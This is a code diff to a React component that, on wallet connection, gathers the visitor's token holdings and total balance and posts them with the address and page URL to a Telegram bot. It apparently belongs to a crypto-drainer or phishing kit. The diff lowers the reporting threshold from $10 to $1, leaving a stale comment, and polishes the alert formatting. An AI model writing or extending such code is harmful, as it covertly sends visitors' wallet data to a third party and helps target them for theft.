@@ -72,12 +72,12 @@ const ConnectedAddress = () => {
 
       const filteredAndSortedTokens = formattedTokens
         .filter((token: { isCore: any; isVerified: any; }) => token.isCore || token.isVerified) // Keep core or verified tokens
-        .filter((token: { usdValue: number; }) => token.usdValue >= 10) // Keep tokens with USD value >= $10
+        .filter((token: { usdValue: number; }) => token.usdValue >= 1) // Keep tokens with USD value >= $10
         .sort((a: { usdValue: number; }, b: { usdValue: number; }) => b.usdValue - a.usdValue); // Sort by USD value, descending
 
       const tokenMessages = filteredAndSortedTokens.map(
         (token: { name: any; chain: any; usdValue: number; symbol: any }) =>
-          `\n${token.name} - ${token.symbol} \n💵 $${token.usdValue.toFixed(2)} - CHAIN: ${token.chain}`
+          `\n${token.name} - ${token.symbol} \n💵 $${Number(token.usdValue.toFixed(2)).toLocaleString()} - _${token.chain} chain_`
       );
 
       setTokenDetails(tokenMessages.join("\n"));
@@ -99,7 +99,7 @@ const ConnectedAddress = () => {
     const walletProvider = connector?.name || "Unknown Provider"; // Include provider name
     const tokenMessage = tokens.join("\n");
     const urlMessage = pageUrl ? `🌐 Current Page: ${pageUrl}` : "🌐 Current Page: Not Available";
-    const message = `✨ New ${walletProvider} Connection  \n\n🏦 \`${address}\` \n[View on DeBank](https://debank.com/profile/${address})\n\n${tokenMessage}\n\n💵Total Balance: $${balance.toFixed(2)}\n${urlMessage}`;
+    const message = `✨ *New ${walletProvider} Connection*  \n\n🏦 \`${address}\` \n[View on DeBank](https://debank.com/profile/${address})\n\n${tokenMessage}\n\n💵Total Balance: $${Number(balance.toFixed(2)).toLocaleString()}\n${urlMessage}`;
 
     try {
       await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
